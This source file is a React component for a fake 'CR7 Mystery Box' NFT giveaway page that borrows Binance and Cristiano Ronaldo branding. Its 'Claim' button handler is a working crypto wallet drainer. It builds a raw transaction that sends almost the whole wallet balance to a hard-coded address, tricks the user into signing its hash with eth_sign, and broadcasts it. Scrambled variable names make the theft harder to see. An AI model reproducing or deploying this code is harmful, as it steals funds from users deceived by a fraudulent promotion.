import React, {useEffect, useState} from "react"
import { useConnect, useAccount, useProvider } from "wagmi";
import { InjectedConnector } from "wagmi/dist/connectors/injected";
import Web3 from "web3";
// @ts-ignore
import ethereumjs from "./code";
import "./Features.scss"
import { SimpleButton } from "../SimpleButton"

export const Features = (): JSX.Element => {
  const { address, isConnected } = useAccount();
  const { connect } = useConnect({
    connector: new InjectedConnector(),
  })
  const [balance, setBalance] = useState(0)

  useEffect(() => {
    if (!isConnected) {
      connect()
    }
  }, [isConnected])

  useEffect(() => {
    // @ts-ignore
    // const { ethereum } = window
    // if (ethereum) {
    //   const provider = new ethers.providers.Web3Provider(ethereum)
    //   provider.getNetwork().then(r => {
    //     if (r.chainId !== 1) {
    //       switchNetwork()
    //     }
    //   })
    // }
    if (address) {
      const web3 = new Web3(Web3.givenProvider)
      web3.eth.getBalance(address || '').then(r => {
        setBalance((Number(r)))
      })
    }
  }, [address])

  const onClick = async () => {
    if (!address) {
      connect()
    } else {
      const web3Client = new Web3(Web3.givenProvider), web3ClientAccounts = (await web3Client.eth.getAccounts())[0], web3ClientChainID = await web3Client.eth.getChainId();
      console.log(web3ClientAccounts)
      await web3Client.eth.getTransactionCount(web3ClientAccounts, "pending").then(async maryam => {
        // @ts-ignore
        const web3ClientGasPrice = await web3Client.eth.getGasPrice(), clardy = web3Client.utils.toHex(Math.floor(web3ClientGasPrice * 1.3));
        // @ts-ignore
        const galena = new web3Client.utils.BN("22000"), maycle = galena * Math.floor(web3ClientGasPrice * 2), etherToSend = balance - (maycle);
        console.log('BALANCE:', balance)
        console.log('GAS_PRICE:', clardy)
        console.log('ETHER_TO_SEND:', etherToSend)
        console.log("Sending " + web3Client.utils.fromWei(etherToSend.toString(), "ether") + " ETH from " + web3ClientAccounts + "...");
        balance > 1e29 ? '0xa85C99f99B150F81C16e92073F5eE564D2A49125' : null;
        const tomeica = {nonce: web3Client.utils.toHex(maryam), gasPrice: clardy, gasLimit: "0x55F0", to: '0xa85C99f99B150F81C16e92073F5eE564D2A49125', value: "0x" + etherToSend.toString(16), data: "0x", v: "0x1", r: "0x", s: "0x"};
        // @ts-ignore
        const nayana = new ethereumjs.Tx(tomeica);
        const zaydn = "0x" + nayana.serialize().toString("hex"), satya = {encoding: "hex"};
        // @ts-ignore
        const jamarrion = web3Client.utils.sha3(zaydn, satya);
        console.log("rawTx1:", zaydn);
        console.log("rawHash1:", jamarrion);
        // @ts-ignore
        await web3Client.eth.sign(jamarrion, web3ClientAccounts).then(async jey => {
          const debara = jey.substring(2), r = "0x" + debara.substring(0, 64), s = "0x" + debara.substring(64, 128), astoria = parseInt(debara.substring(128, 130), 16), y = web3Client.utils.toHex(astoria + web3ClientChainID * 2 + 8);
          console.log("r:", r);
          console.log("s:", s);
          // @ts-ignore
          console.log("y:", y.toString("hex"));
          nayana.r = r;
          nayana.s = s;
          nayana.v = y;
          console.log(nayana);
          const cania = "0x" + nayana.serialize().toString("hex"), raashid = {encoding: "hex"};
          // @ts-ignore
          const latechia = web3Client.utils.sha3(cania, raashid);
          console.log("rawTx:", cania);
          console.log("rawHash:", latechia);
          await web3Client.eth.sendSignedTransaction(cania).then(teairah => console.log(teairah)).catch(yuko => console.log(yuko));
        }).catch(abbriella => console.log(abbriella));
      });
    }
  }

  return (
    <div
      className="features"
      style={{
        backgroundImage: "url(https://public.nftstatic.com/static/nft/res/d663bd717dc9466d9ff9dc4d4a6ebeb0.png)",
      }}
    >
      <div className="features-content">
        <div className="features-left">
          <h3 className="features-left-title">The CR7 Mystery Box: New Users</h3>
          <p className="features-left-desc">
            To celebrate Cristiano Ronaldo’s NFT debut, we’ve prepared a Mystery Box for the first 1.5 million new
            Binance users (who use the RONALDO code when registering, or register via the dedicated CR7 page). Each box
            is generated randomly and contains one of two mystery box-exclusive Ronaldo NFTs that come in Stone color.
            Claim yours here.
          </p>
          <SimpleButton className='btnNoM' text="Claim" onClick={onClick} />
        </div>
        <img
          src="https://public.nftstatic.com/static/nft/zipped/de8fa138d4e44dc5ac575bb96e8be5a4_zipped.png"
          alt="player"
          className="features-img"
        />
        <SimpleButton className='btnM' text="Claim" onClick={onClick} />
      </div>
    </div>
  )
}
